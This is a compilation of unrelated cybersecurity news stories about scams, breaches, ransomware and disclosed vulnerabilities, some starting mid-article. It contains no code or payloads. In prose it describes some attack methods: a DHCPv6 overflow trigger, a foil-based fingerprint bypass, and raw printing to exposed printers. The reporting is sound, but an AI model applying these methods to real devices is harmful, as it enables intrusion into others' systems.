""Since this afternoon, I have been unable to use Teamviewer through a TalkTalk connection,"" said the first user that complained about the block, saying that TeamViewer works fine from his mobile 4G connection, but not his home TalkTalk line.
Tens of other users followed suite and shared similar experiences.
As it became clear to all that TalkTalk had banned TeamViewer on its network, the company admitted the issues through a representative.
Apologies for the confusion, but I can confirm that we have implemented a number of  network changes that have blocked a number of applications including Teamviewer
We constantly monitor for potentially malicious internet traffic, so that we can protect our customers from phishing and scamming activities.
As part of this work, we have recently blocked a number of sites and applications from our network, and we’re working hard to minimise the impact on our customers.
We are working with teamviewer and other 3rd parties on implementing some additional security measures that would enhance the security to all customers of these services but we will continue to block any sites/applications reported by customers to reduce the opportunity for fraud to take place.
The issues the TalkTalk representative was referring to are a wave of scams that have hit TalkTalk customers over the past year.
The data of millions of TalkTalk customers leaked online in 2015 when the company experienced three separate data breaches in the same year.
Scammers have been using some of the leaked TalkTalk data to target the ISP's customers during the past two years.
Several topics on the TalkTalk forums detail such events, which all start with a phone call from one of the scammers.
In many cases, the scammer has an Indian accent, poses as a TalkTalk employee, and asks users to install TeamViewer to assist customers with a technical issue or to fix security errors.
TeamViewer, which is a legitimate app used worldwide by tech departments, allows the scammer to access the victim's computer and install malware such as keyloggers or backdoor trojans right under the unsuspecting victim's nose.
In some cases, parts of the TeamViewer app has even been embedded in malware directly, as to simplify the process of stealing data via a legitimate communications channel, disguising the data theft operations under TeamViewer traffic.
Apps like TeamViewer, Supremo, and LogMeIn, have all been used as part of tech support scams for years.
The only surprise is TalkTalk's pro-active reaction, which comes two days after the BBC ran a story documenting the operations of an Indian scam call center that was specifically targeting TalkTalk customers.
Anticipating criticism from customers, other news outlets, and a possible sanction from government agencies, TalkTalk decided to take a pro-active approach and fight the scammers by blocking some of the apps they used.
For its part, TeamViewer has been very accommodating, saying in a statement published yesterday that the two companies are in ""extensive talks to find a comprehensive joint solution to better address this scamming issue.""
In an email, a TeamViewer spokesperson told Bleeping Computer they expect to reach a consensus with TalkTalk, who is ""aware that this not a TeamViewer specific issue,"" and both companies are working to ""bring about additional measures to thwart scamming.""
Imagine if Team Viewer and other such remote software would give a big red alert explaining that their software is often used by criminals stating they were from ISPs, Microsoft or some security tech as the first window seen when opening the software.

Vanilla Forums open source software suffers from vulnerabilities that could let an attacker gain access to user accounts, carry out web-cache poisoning attacks, and in some instances, execute arbitrary code.
Popular open source forum software suffers from vulnerabilities that could let an attacker gain access to user accounts, carry out web-cache poisoning attacks, and in some instances, execute arbitrary code.
Legal Hackers‘ Dawid Golunski found the vulnerabilities, a host header injection and an unauthorized remote code execution vulnerability–in software which is developed by Vanilla Forums.
Golunski reported the issues to Vanilla Forums in January and while a support team acknowledged his reports, he’s experienced five months of silence from the company since, something that prompted him to finally disclose the vulnerabilities Thursday via his ExploitBox.io service.
The researcher confirmed the vulnerabilities exist in the most recent, stable version (2.3) of Vanilla Forums. He presumes older versions of the forum software are also vulnerable.
When reached Thursday, Lincoln Russell, a senior developer at Vanilla Forums stressed the vulnerabilities, which are in the middle of being fixed, only affect the company’s free and open source product.
Golunski says the most concerning vulnerability, the RCE (CVE-2016-10033) stems from a PHPMailer vulnerability he disclosed last December. An attacker could remotely exploit the same vulnerability in Vanilla Forums by sending a web request in which a payload is passed within the HOST header.
Until a fix is pushed Golunski is encouraging users to preset the sender’s support email address to a static value to prevent the dynamic creation of an email address, or the use of the HOST header, as a temporary mitigation.
Golunski says the second issue, the host header injection vulnerability (CVE-2016-10073) also affects version 2.3 of the software.
The issue stems from the fact that the forum software uses user-supplied HTTP HOST header when sending emails from the host on which the forum was installed. That means an attacker could use HTTP HOST header to set the email domain to an arbitrary host.
It would require user interaction but if exploited, it’s possible the bug could help an attacker intercept a password reset hash and gain access to a victim’s account.
An attacker would have send the victim an email tricking them into clicking through a password reset link, he says.
“The resulting email will have the sender’s address set to noreply@attackers_server. The password reset link will also contain the attacker’s server which could allow the attacker to intercept the hash if the victim user clicked on the malicious link,” Golunski wrote Thursday.
It’s possible the vulnerability could also lead to web-cache poisoning if the HOST header is used to form links in web responses Golunski says.
According to Russell, when Vanilla Forums responded to Golunski in January it told him the issue would take some time to fix due to the “complexity of unwinding the use of this server variable without breaking the myriad scenarios it can be used for in open source environments.”

Golunski hinted at the vulnerabilities in Vanilla Forums back in December but didn’t name the software. When he disclosed the initial PHPMailer bug the researcher mentioned that he had developed an unauthenticated RCE exploit for “a popular open-source application (deployed on the Internet on more than a million servers) as a PoC for real-world exploitation.”
Both the Vanilla Forums vulnerabilities and a similar RCE vulnerability in WordPress 4.6 Golunski disclosed last week both relate to PHPMailer and PHP mail() function injection.
“The exploits and techniques prove that these type of vulnerabilities could be exploited by unauthenticated attackers via server headers such as HOST header that may be used internally by a vulnerable application to dynamically create a sender address,” Golunski told Threatpost Thursday, “This adds to the originally presented attack surface of contact forms that take user input including From/Sender address.”

Members of the Girl Scouts of Orange County were notified this week that their personal information may have been exposed to an unknown party who gained access to an organization email account last month, according to a letter sent to members.
The organization sent the letter Tuesday to about 2,800 members who may have been affected by the data breach.
Christina Salcido, vice president of mission operations, said members’ names, birth dates, home addresses, insurance policy numbers and health history information could have been accessed from Sept 30 to Oct 1.
“Out of an abundance of caution, we are notifying everyone whose email was in this email account,” Salcido wrote in the letter.
On the day the organization became aware of the breach, IT services changed the password and determined it was secure, Salcido wrote. The Girl Scouts of Orange County reviewed the account, eliminated all personal information it contained and notified the California attorney general’s office of the breach.
Because the email account was used for the organization’s travel purposes, it contained information about members dating to 2014. Salcido said the third party used the account to send messages, but she did not specify what type of messages were sent.
Elizabeth Fairchild, spokeswoman for the Girl Scouts of Orange County, said staff members noticed Oct 1 that the email account had been used the day before “to send out non-Girl Scout related emails.” On Oct 1, staff members sent an email to members telling them what happened, stating they had secured the account and advising them to not open any unusual emails from that account.
“The vast majority of information stored in the account was nonsensitive,” Fairchild said. “Fewer than 300 had sensitive information stored in the account.”
The Girl Scouts of Orange County provided contact information for the credit bureaus Equifax, Experian and TransUnion and suggested that members place fraud alerts on their accounts.
If members have questions or concerns about the breach, they can call (800) 974-9444 or email customercare@girlscoutsoc.org.

Hollywood Presbyterian Medical Center paid a $17,000 ransom in bitcoin to a hacker who seized control of the hospital's computer systems and would give back access only when the money was paid, the hospital's chief executive said Wednesday.
The assault on Hollywood Presbyterian occurred Feb 5, when hackers using malware infected the institution's computers, preventing hospital staff from being able to communicate from those devices, said Chief Executive Allen Stefanek.
The hacker demanded 40 bitcoin, the equivalent of about $17,000, he said.
""The malware locks systems by encrypting files and demanding ransom to obtain the decryption key. The quickest and most efficient way to restore our systems and administrative functions was to pay the ransom and obtain the decryption key,"" Stefanek said. ""In the best interest of restoring normal operations, we did this.""
The hospital said it alerted authorities and was able to regain control of all its computer systems by Monday, with the assistance of technology experts.
Stefanek said patient care was never compromised, nor were hospital records.
Top hospital officials called the Los Angeles Police Department last week, according to police Lt John Jenal.
Laura Eimiller, an FBI spokeswoman, said the bureau has taken over the hacking investigation but declined to discuss specifics of the case. Law enforcement sources told The Times that the hospital paid the ransom before reaching out to law enforcement for assistance.
The attack forced the hospital to return to pen and paper for its record-keeping.

In 2015, the FBI shuttered malware marketplace Darkode, and then at the end of last year a small group of hackers launched their own eponymous copycat version.
Almost immediately, however, other hackers attacked that new site, and stole user account information.
""It's a shit show on what happened,"" a Darkode staff member who used the handle Bullets told Motherboard.
Hackers managed to steal a database of Darkode's users, including usernames and hashed passwords.
Paid breach notification site LeakBase provided Motherboard with a copy of the data.
The database included this reporter's Darkode account, used to briefly visit the site when it launched.
The data also includes users' email addresses and IP addresses; something that might be particularly worrying if those who signed up were involved in any illegal activity—it probably doesn't help to have an IP address linked to your identity floating around the internet.
It's fucked up,"" one of the hackers behind the breach, who used the moniker FuckInterpol, told Motherboard.
""Dear fake darkode wannabes, you're [sic] forum has been owned, and your admins have terrible opsec,"" one message posted to the forum read.
The hackers also deleted other threads on the site.
Bullets, the staff member, claimed the hackers got in, at least in part, because he reused a password from another previously hacked site.
""The only reason I joined in the first place was just to see what the hell was actually going on.
I used a common password I use when I signed up thinking nothing of it seeing I never thought I'd stay on the site & if anyone got access to it, it wouldn't be a big deal,"" Bullets said.

Today, federal officials announced new charges relating to the 2014 hack of Yahoo, alleging a conspiracy between criminal hackers and the Russian Federal Security Agency (or FSB). The indictment names two FSB agents — Igor Suschin and Dmitry Dokuchaev — who allegedly contracted two criminal hackers — Aleksey Belan and Karim Baratov — to compromise Yahoo’s database, which included both US military officers and Russian journalists believed to be of interest to the FSB. Baratov was arrested yesterday in Canada, Department of Justice officials say.
“There are no free passes for foreign, state-sponsored criminal behavior,” Assistant Attorney General McCord told reporters at a press conference.
When Yahoo first disclosed the breach in September, the company attributed the attack to “a state-sponsored actor,” a claim that some security experts found questionable at the time. Subsequent reports found that the Yahoo database was sold a number of times, suggesting a criminal profit motive rather than intelligence gathering.
According to the Department of Justice, that was a result of the FSB’s collaboration with its criminal contractors, who sold much of the stolen information after it had been handed over. One of the contractors also allegedly searched the accounts for gift cards and other financial info.
Yahoo’s database was breached two separate times during the period — once in August 2013 and again in late 2014, revealing account details for hundreds of millions of users each time. Today’s charges deal only with the 2014 breach, which compromised 500 million accounts. Many blamed Yahoo CEO Marissa Mayer for refusing to invest in more robust security measures. Mayer later acknowledged the error, and gave up her annual salary, bonus and equity grant for 2016 as a result.
Details of the breaches became public only after Yahoo had struck a deal to be acquired by Verizon. News of the security issues caused significant friction in the deal, ultimately causing Verizon to lower its purchase price by $350 million, to $4.4 billion dollars.

MWR Labs researchers recently disclosed two high-security vulnerabilities in LG G3, G4, and G5 mobile devices.
The bugs include a Path Transversal flaw and an Arbitrary File Disclosure flaw, according to the respective security advisories.
The Path Transversal flaw was caused by the application not validating that URL parameters did not contain potentially malicious characters and could allow an attacker on the same network as a user to make any media file or folder shareable without authentication or user interaction.
The Arbitrary File Disclosure flaw was caused by the SmartShare.Cloud application launching an unauthenticated HTTP Server listening on all interfaces while connected to a WiFi network and could allow an attacker to retrieve any media file from the Cloud storage of the victim as long as they knew the file name.
Users are encouraged to ensure their devices are updated to the latest versions as Version 2.4.0 has mitigated the issues.

A series of remotely exploitable vulnerabilities exist in a popular web-based SCADA system made by Honeywell that make it easy to expose passwords and in turn, give attackers a foothold into the vulnerable network.
The flaws exist in some versions of Honeywell’s XL Web II controllers, systems deployed across the critical infrastructure sector, including wastewater, energy, and manufacturing companies.
An advisory from the Department of Homeland Security’s Industrial Control Systems Cyber Emergency Response Team (ICS-CERT) warned about the vulnerabilities Thursday.
The company has developed a fix, version 3.04.05.05, to address the issues but users have to call their local Honeywell Building Solutions branch to receive the update, according to the company.
The controllers suffer from five vulnerabilities in total but the scariest one might be the fact that passwords for the controllers are stored in clear text.
Furthermore, if attackers wanted to, they could disclose that password simply by accessing a particular URL.
An attacker could also carry out a path traversal attack by accessing a specific URL, open and change some parameters by accessing a particular URL, or establish a new user session.
The problem with starting a new user session is that the controllers didn’t invalidate any existing session identifier, something that could have made it easier for an attacker to steal any active authenticated sessions.
Maxim Rupp, an independent security researcher based in Germany, dug up the bugs and teased them on Twitter at the beginning of January.
Rupp has identified bugs in Honeywell equipment before.
Two years ago he discovered a pair of vulnerabilities in Tuxedo Touch, a home automation controller made by the company, that could have let an attacker unlock a house’s doors or modify its climate controls.
It’s unclear how widespread the usage of Honeywell’s XL Web II controllers is.
While Honeywell is a US-based company, according to ICS-CERT’s advisory the majority of the affected products are used in Europe and the Middle East.
When reached on Friday, a spokesperson for Honeywell confirmed that the affected controllers are used in Europe and the Middle East.
The company also stressed that the vulnerabilities were patched in September 2016 after they were reported in August.

The messages included ASCII art depicting robots and warned that the printers had been compromised and they were part of a botnet.
The hacker, who uses the online alias Stackoverflowin, later said that the botnet claim was not true and that his efforts served only to raise awareness about the risks of leaving printers exposed to the internet.
Stackoverflowin claims to be a high-school student from the U.K. who is interested in security research.
He said that for the most part he simply sent print jobs using the Line Printer Daemon (LPD), the Internet Printing Protocol (IPP) and the RAW protocol on communications port 9100 to printers that didn't require authentication.
However, he also claims to have exploited an undisclosed remote command execution (RCE) vulnerability in the web management interface of Xerox printers.
The hacker estimates that up to 150,000 printers were affected by his effort, but claims to have access to more RCE flaws that he didn't use and which would have allowed him to print to over 300,000 printers.
As printers around the world started printing the hacker's rogue messages on Friday, affected users took to Twitter to report the problem.
From the photos they posted, it appears that many of the printers were part of point-of-sale systems.
The issue of publicly exposed printers is not new and has been exploited before to print rogue and sometimes offensive messages.
However, the issue was renewed last week when researchers from Ruhr-University Bochum in Germany published a paper on different attacks against network printers and an assessment of 20 printer models.

Researchers at cybersecurity company Check Point have today shared details of a vulnerability in DJI’s infrastructure that could have given hackers access to consumer and corporate user accounts, personal data, flight logs, photos, videos, and – if the user was flying with DJI’s FlightHub application – a live camera feed and map during missions.
Check Point submitted a report to DJI’s Bug Bounty Program, highlighting a process in which an attacker could have gained access to a user’s account through a vulnerability discovered in the user identification process within DJI Forum.
Check Point’s researchers found that DJI’s various platforms used a token to identify registered users across different aspects of the customer experience. Hackers could plant malicious links that would compromise accounts within that framework.
In a blog post outlining their investigation, Check Point explained the process of a possible exploit:
The vulnerability was accessed through DJI Forum, an online forum DJI runs for discussions about its products. A user who logged into DJI Forum, then clicked a specially-planted malicious link, could have had his or her login credentials stolen to allow access to other DJI online assets:
        DJI’s web platform (account, store, forum)
        Cloud server data synced from DJI’s GO or GO 4 pilot apps
        DJI’s FlightHub (centralized drone operations management platform)

We notified DJI about this vulnerability in March 2018 and DJI responded responsibly. The vulnerability has since been patched. DJI classified this vulnerability as high risk but low probability, and indicated there is no evidence this vulnerability was ever exploited by anyone other than Check Point researchers.
Check Point even made a Mission Impossible-style trailer for their findings, which is… interesting.

If you've just paid your self-assessment tax bill, be vigilant if you receive an email informing you that you're due a refund.
Fraudsters are targeting taxpayers with spurious emails and text messages pretending to be from the government. 
I received one such email over the weekend, telling me I was due a refund of £222.32. 
The email came complete with a bogus 'HMRC Transaction Confirmation' number and a link claiming to be to the Government Gateway, which is used to access online government services.
Of course, I would just need to click on the bogus link with my 'credit/debit card ready' so the criminals at the other end of the link could scam my cards for as much money as possible.
At first glance, it may look fairly convincing - the spelling and grammar is pretty good, it contains plenty of official-looking reference numbers and the web links are at least in part quite similar to the genuine articles. 
But it's very definitely a 'phishing' email - whereby the fraudster sender is trying to hook you into providing personal information. In this case, they're after my credit or debit card numbers.
Phishing happens by text message too. Earlier this month HMRC reported people are nine times more likely to fall for text message scams than other types such as email because they can appear more legitimate, with many texts displaying ‘HMRC’ as the sender, rather than a phone number.
It also said it had 'stopped thousands of taxpayers from receiving scam text messages, with 90 per cent of the most convincing texts now halted before they reach their phones'.
To help you protect yourself and your bank account, there are several warning signs you should always look out for to determine whether such emails and texts are fakes 

This is in case they contain malware - software with a virus that can read personal information on your computer – or destroy it. The bug is often activated by users inadvertently opening an attachment or clicking on an email link.
And it's not just emails and texts about tax refunds you need to be vigilant towards. 
A spokesman for Action Fraud told This is Money: 'At this important time in the tax year when people will be claiming refunds, we are warning of fraudsters who contact victims claiming to be from HMRC to trick them into paying bogus debts and taxes. 
'These criminals will contact victims in many ways, including spoof calls, voicemails and text messages. And in most cases they will ask for payments in iTunes giftcards.
'It is important that people spot the signs of this type of fraud to protect themselves.
'HMRC will never use text messages to inform about a tax rebate or penalty and will never ask for any payment in the form of iTunes vouchers.'

Security experts say they are skeptical that a group of hackers called Turkish Crime Family actually possess a cache of hundreds of millions of Apple iCloud account credentials.
A more plausible explanation, they say, is that crooks used credential stuffing attacks to amass a limited number of valid Apple usernames and passwords in attempt to extort money from Apple.
Earlier this week, the group identifying itself as the Turkish Crime Family claimed to have a database of 750 million iCloud.com, me.com and mac.com email addresses and credentials.
“There have not been any breaches in any of Apple’s systems including iCloud and Apple ID,” Apple said in a statement.
“The alleged list of email addresses and passwords appears to have been obtained from previously compromised third-party services”.
Hackers behind the claim are demanding Apple pay them $75,000 in cryptocurrency or give them $100,000 in iTunes vouchers, according to reports.
If  demands are not met by April 7, the group said it will begin deleting data stored on iCloud accounts en masse.
An independent analysis of 54 samples of the breached account data provided to ZDNet by the hackers were valid.
However, security experts such as Troy Hunt, who runs the data breach repository HaveIBeenPwned.com, still isn’t convinced.
Hunt told Threatpost he suspects the hack is a hoax, admitting he has not seen the any samples of the breached data.
“It’s entirely possible whoever is behind this could have username and password pairs that work on a limited number of Apple accounts in just the same way as re-used credentials will work across all sorts of other accounts,” Hunt said.
He said the Turkish Crime Family likely has a far smaller pool of valid Apple credentials than it claims.
Shuman Ghosemajumder, CTO of the firm Shape Security told Threatpost he suspects the hackers may have used credential stuffing attacks, using data from previous breaches, to gain access to an undetermined number of iCloud accounts.
Shape Security estimates that last year alone 3.3 billion credentials were exposed via breaches.
Despite credential stuffing’s low success rate of  1 percent to 2 percent, Ghosemajumder said, when applied to a large enough cache of data (purchased on the dark web by the database) the hackers may have enough information to successfully crack thousands of Apple accounts.
“There are certainly enough credentials spilled onto the internet to think someone could use credential stuffing techniques to pull together a convincing number of valid accounts in attempt to extort Apple for ransom money,” Ghosemajumder said.
Patrick Wardle, director of research at Synack, echoed the same credential theory suggesting that breaches over the past year have given hackers ample opportunity to pull together some valid iCloud account credentials.
Since approaching Apple earlier this month with its demands, the Turkish Crime Family has been inconsistent about how many account credentials it allegedly possesses.
Speaking to various different media outlets, the group has said it had 200 million credentials to as many as 750 million.
The hacking group said that its repository isn’t the result of one breach, rather multiple.
On Thursday, the group claimed to have a database of 750 million credentials, 250 million of which are “checked and working,” according to the group.
Meanwhile, Apple says it’s actively monitoring to prevent unauthorized access to user accounts and is working with law enforcement to identify the criminals behind the Turkish Crime Family extortion scheme.

A security bug in Systemd can be exploited over the network to, at best, potentially crash a vulnerable Linux machine, or, at worst, execute malicious code on the box.
The flaw therefore puts Systemd-powered Linux computers – specifically those using systemd-networkd – at risk of remote hijacking: maliciously crafted DHCPv6 packets can try to exploit the programming cockup and arbitrarily change parts of memory in vulnerable systems, leading to potential code execution. This code could install malware, spyware, and other nasties, if successful.
The vulnerability – which was made public this week – sits within the written-from-scratch DHCPv6 client of the open-source Systemd management suite, which is built into various flavors of Linux.
This client is activated automatically if IPv6 support is enabled, and relevant packets arrive for processing. Thus, a rogue DHCPv6 server on a network, or in an ISP, could emit specially crafted router advertisement messages that wake up these clients, exploit the bug, and possibly hijack or crash vulnerable Systemd-powered Linux machines.
Here's the Red Hat Linux summary:
systemd-networkd is vulnerable to an out-of-bounds heap write in the DHCPv6 client when handling options sent by network adjacent DHCP servers. A attacker could exploit this via malicious DHCP server to corrupt heap memory on client machines, resulting in a denial of service or potential code execution.
Felix Wilhelm, of the Google Security team, was credited with discovering the flaw, designated CVE-2018-15688. Wilhelm found that a specially crafted DHCPv6 network packet could trigger ""a very powerful and largely controlled out-of-bounds heap write,"" which could be used by a remote hacker to inject and execute code.
""The overflow can be triggered relatively easy by advertising a DHCPv6 server with a server-id >= 493 characters long,"" Wilhelm noted.
In addition to Ubuntu and Red Hat Enterprise Linux, Systemd has been adopted as a service manager for Debian, Fedora, CoreOS, Mint, and SUSE Linux Enterprise Server. We're told RHEL 7, at least, does not use the vulnerable component by default.
Systemd creator Lennart Poettering has already published a security fix for the vulnerable component – this should be weaving its way into distros as we type.
If you run a Systemd-based Linux system, and rely on systemd-networkd, update your operating system as soon as you can to pick up the fix when available and as necessary.
The bug will come as another argument against Systemd as the Linux management tool continues to fight for the hearts and minds of admins and developers alike. Though a number of major admins have in recent years adopted and championed it as the replacement for the old Init era, others within the Linux world seem to still be less than impressed with Systemd and Poettering's occasionally controversial management of the tool.

The Cyber Division of the U.S. Federal Bureau of Investigation (FBI) has issued an alert to warn the healthcare industry that malicious actors are actively targeting File Transfer Protocol (FTP) servers that allow anonymous access.
According to the law enforcement agency, attackers have targeted the FTP servers of medical and dental facilities in an effort to obtain access to protected health information (PHI) and personally identifiable information (PII), and use it to intimidate, blackmail and harass business owners.
“The FBI recommends medical and dental healthcare entities request their respective IT services personnel to check networks for FTP servers running in anonymous mode.
If businesses have a legitimate use for operating a FTP server in anonymous mode, administrators should ensure sensitive PHI or PII is not stored on the server,” the FBI said.
These servers allow users to authenticate with only a username, such as “anonymous” or “ftp,” and either a generic password or no password at all.
The FBI pointed out that vulnerable FTP servers can also be abused to store malicious tools or to launch cyberattacks.
In 2015, IBM named healthcare as the most attacked industry, with more than 100 million records compromised, after in the previous year this sector did not even make it to the top five.
An IBM report for 2016 showed that the volume of compromised records was smaller, but the number of data breaches increased, causing operational, reputational and financial damage to healthcare organizations.
A report published recently by Fortinet showed the top threats targeting healthcare companies in the last quarter of 2016, including malware, ransomware, IPS events, exploit kits and botnets.

Ransomware creators have attacked Malaysian media giant Media Prima Bhd and are demanding bitcoins before they can allow access to the company’s compromised computer systems.
According to The Edge Markets, which initially broke the news, the hackers struck on November 8 consequently denying the company’s employees access to the email system. The hackers are now demanding 1,000 bitcoins, translating to approximately US$6.3 million at current market prices, to reauthorize access.
Media Prima did not, however, confirm the attack though sources indicated that the publicly listed company would not be paying the ransom. Sources also told The Edge Markets that with access to the office email denied, the media giant had migrated to G Suite, a Google product hosted offsite.
It was also not immediately clear whether the company which owns four TV stations, four radio stations and three national newspapers among other media assets had lodged a complaint with the police.
Lucrative Business
While extortionists have been targeting individuals in the recent past especially by threatening to reveal the porn-viewing habits of their victims, it has generally been more lucrative to target businesses. According to a report by cybersecurity firm Sophos, the SamSam ransomware, which has mostly targeted business enterprises and public bodies, has, for instance, generated its creators bitcoin worth more than US$6 million since it emerged three years ago.
Some of the high-profile victims of ransomware attacks in the recent past have included the Port of San Diego. While the Californian port did not reveal the amount that the hackers demanded, it was serious enough that it got the U.S. Federal Bureau of Investigations, the U.S. Department of Homeland Security and the U.S. Coast Guard involved.
“As previously stated, the investigation has detected that ransomware was used in this attack. The Port can also now confirm that the ransom note requested payment in Bitcoin, although the amount that was requested is not being disclosed,” a statement from the Port of San Diego read, as CCN reported at the time.
Can’t Pay, Won’t Pay
Another high-profile target of ransomware in the recent past was the Professional Golfers Association (PGA) of America. In this case, the hackers encrypted critical files denying access to them just as the golfing body was holding a PGA Championship event as well as preparing for the Ryder Cup.

No one likes to have their company hacked. No one is going to be happy if hackers manage to break into systems and steal away their intellectual property.
In the case of companies like Disney, having a $230 million blockbuster like the latest Pirates of the Caribbean movie stolen could prove to be very costly if hackers follow through with their threats to seed their pirated copy of the film on torrent sites, disrupting its official release.
But imagine how much more galling it would be to give in to the hackers’ blackmail threats and pay a ransom for the movie not to be leaked online, only to discover later that the extortionists never had a copy of the film in the first place?
Earlier this month it was widely reported that Walt Disney’s CEO Bob Iger had been contacted by hackers who were threatening to release one of the studio’s movies onto the internet unless a ransom was paid.
Iger didn’t say what movie the hackers claimed to have stolen, but it was widely thought to be the soon to be released “Pirates of the Caribbean: Dead Men Tell No Tales.”
That theory of the hacked movie’s identity certainly gained more momentum when it was reported that torrents had been spotted on Pirate Bay claiming to be the blockbuster starring Johnny Depp, Javier Bardem and Geoffrey Rush.

However, none of those downloadable torrents were confirmed to contain the “Pirates of the Caribbean” movie. And in a video interview with Yahoo Finance, Disney’s CEO debunked claims that a movie had ever been stolen:
“To our knowledge we were not hacked. We had a threat of a hack of a movie being stolen. We decided to take it seriously but not react in the manner in which the person who was threatening us had required. We don’t believe that it was real and nothing has happened.”
In short, Disney says that it was not accurate that a movie was ever stolen, and it refused to pay the ransom demand to the extortionists.
And that, in itself, may be a lesson for other companies to keep a cool head when they receive an extortion demand claiming that intellectual property or sensitive data has been stolen by hackers.
Obviously all threats should be taken seriously, and you should explore appropriately whether it is possible a security breach has genuinely occurred, review the security of your systems, and inform law enforcement agencies as appropriate.
But don’t be too quick to pay the criminals who are making threats against you. If you can, seek evidence that the hackers have what they claim to have, rather than reaching first for your wallets.
It’s perfectly possible that some extortionists are simply jumping on the bandwagon of high profile hacks in an attempt to trick you into believing your company is the latest victim.
Keep a cool head when your company receives a threat, or else you might find yourself in deep water, swimming with the hungry fishes.

Most CISOs like a challenge. Matthew Maglieri faced more than a challenge when he agreed to become the chief information security officer for Ruby Life Inc., parent of the Toronto-based Ashley Madison and other dating sites which in 2015 saw hackers release records of some 36 million members, plus application code and corporate email.
Even Maglieri says the company suffered a “tremendous loss of consumer trust,” and “users relied on discretion using the service, and that discretion was violated.”
When he tried recruiting security staff this year a number balked when hearing who their employer would be.
In fact, he admitted Wednesday at the monthly meeting of the Toronto Area Security Klatch (TASK), a group of infosec pros and students, that a headhunter he consulted flatly told him to decline the offer.
“Absolutely not, your personal brand is at stake,” he recalled being told.
And that’s why he said yes.
“I thought about it ‘If I don’t do this there isn’t going to be anybody fighting for the users,” he said. “I wanted to dive in and take on the challenge.”
Now the company is recovering, Maglieri says, because it is signing up 550,000 users a month. He didn’t say if the overall number of users is down from the breach, which captured headlines around the world. The Ashley Madison site claims over 56 million members have joined since 2002.
Maglieri explained over some 60 minutes how Ruby Life has tried to build a leading data privacy and information security program to regain trust.
That includes having a full-time red team for penetration testing, building a “hypersegmented network,” extensive use of multi-factor authentication on the corporate servers to limit outside access by stolen credentials, decentralized and segmented directory services for employee login, controls to prevent lateral movement through the network, advanced threat detection and an around-the-clock security operations centre run by a consulting firm.
Former federal interim privacy commissioner Chantal Bernier was hired at the end of 2016 as special privacy advisor to guide the privacy remediation program “to the next level.”
It also includes a mission statement Maglieri drafted, saying his goal is “to build a leading intelligence-led threat-based program capable of defending against the most advanced threats.”
Asked in an interview if after nine months that has been achieved, he replied, “The thing about mission statements is they’re objectives, and as a security professional [would say], it’s a journey. It’s about risk management and I think we’re doing some things we’re proud of, we’re making significant progress, and we’re continuously pushing forward.”
Attackers come up with new techniques, he added, and his team has to get better as defenders. “It’s a constant process.”
While he wants a resilient secure environment “to prevent something like this happening again,”
he admitted that as a company that runs several dating sites, we “will remain a very high profile target.”
The company wants to take privacy “to the next level,” Maglieri says. While there is no obligation for users to register with their real names or occupations he did describe the alleged occupations of users and why the company will continue to be a target, particularly for nation states looking for evidence for blackmail.
”The Ashley Madison user base spans a cross-section of society – there’s police, military, government, research, medical, corporate, education — you name it, those people are in there. These are people that could be targets, and data that could be used to target those individuals.”
As a result, he said, the company now has “zero risk tolerance” for security and privacy problems.

A design flaw affecting all in-display fingerprint sensors – that left over a half-dozen cellphone models vulnerable to a trivial lock-screen bypass attack – has been quietly patched. The flaw was tied to a bug in the popular in-display fingerprint reader technology used for user authentication.
In-display fingerprint reader technology is widely considered an up-and-coming feature to be used in a number of flagship model phones introduced in 2019 by top OEM phone makers, according to Tencent’s Xuanwu Lab which is credited for first identifying the flaw earlier this year.
“During our research on this, we found all the in-display fingerprint sensor module suffer the same problem no matter where it was manufactured by whatever vendors,” said Yang Yu, a researcher at Xuanwu Lab. “This vulnerability is a design fault of in-display fingerprint sensors.”
Impacted are all phones tested in the first half of 2018 that had in-display fingerprint sensors, said Yu.
That includes current models of Huawei Technologies’ Porsche Design Mate RS and Mate 20 Pro model phones. Yu said that many more cellphone manufacturers are impacted by the issue.
However, Yu would not specify other impacted vendors or models: “Vendors differ greatly in the attitude to security issues, someone have open attitudes, like Huawei, and in contrast, some vendors strongly hope us to keep the voice down on this,” he told Threatpost. He noted Huawei has been forthcoming, issuing patches to address the issue.
Other phones that use the feature include Vivo Communication Technology’s V11 Pro, X21 and Nex ; and OnePlus’ 6T and Xiaomi Mi 8 Explorer Edition phones. Vivo, OnePlus and Xiaomi did not respond to requests for comment from Threatpost.
In-display fingerprint readers based on optical fingerprint imaging, experts believe, will soon replace conventional authentication based on capacitance-sensor fingerprint scanners. In-display readers allow for a user to place a finger on the screen of a smartphone where a scanner from behind the display can verify a fingerprint, authenticate the user and unlock the phone.
Design-wise the feature allows phones to be sleeker and less cluttered, supporting infinity displays. Usability advantages include the ability to unlock the phone simply by placing your finger on the phone’s screen at any angle, whether it’s sitting on a table or in a car mount.
The vulnerability, which Huawei issued a patch (CVE-2018-7929) for in September, can be exploited in a matter of seconds, researchers said. In an exclusive interview with Threatpost on the flaw Yu said all an attacker needs to carry out the attack is an opaque reflective material such as aluminum foil. By placing the reflective material over a residual fingerprint on the phone’s display the capacitance fingerprint imaging mechanism can be tricked into authenticating a fingerprint.

There’s a new LinkedIn scam doing the rounds, involving phishing emails and a fake website designed to harvest the information you have in your CV.
In the first stage of the scam, you receive a phishing email disguised as a LinkedIn email.
Here are just a few of the giveaways that this is a phishing email:
Clicking either of the two links in the spam email will send you to https://linkedinjobs (dot ) jimdo (dot) com.
We scanned the link with VirusTotal, and most of the security solutions found it to be clean, with the exception of a less well known scanner, AutoShun.
Clicking on the website itself will take you to a simple page, where the main focus falls on a form for uploading your CV.
Your CV contains a wealth of personal data which a cybercriminal uses to make a profit at your expense.
Phone numbers can be sold for companies doing promotional cold calling. Or, the cybercriminal might call you himself in a vishing attack.
Sometimes however, the attacker targets a company you worked at (or a future company you want to work for). Using the information found within your CV, the attacker might impersonate you in order to launch spear phishing emails against people in those companies, such as the CEO or the accounting department, in order to illegally obtain funds or money transfers.
In 2016 for instance, the CEO of an Austrian airplane component manufacturer was fired after he got tricked by a spear phishing attack that led him to transfer around 40 million euros to the scammer’s account.
This isn’t the first time LinkedIn has been used a cover for a phishing campaign. Another similar situation was encountered in 2016, which we also covered.
It’s difficult (if not impossible) for companies alone to prevent these scams from taking place. In these cases, users too should contribute to keeping the Internet safe.
In cases involving LinkedIn, the best course of action is to report these to the company:
LinkedIn itself also offers a thorough set of tips and advice on how to recognize various scams over the network, such as inheritance or dating scams.
When you’re actively searching for a job, being offered one in such a compelling tone might seem appealing. Because you expect to receive such messages (indeed, you welcome them) you’re tempted to let your guard down, and that’s exactly when a scammer strikes.

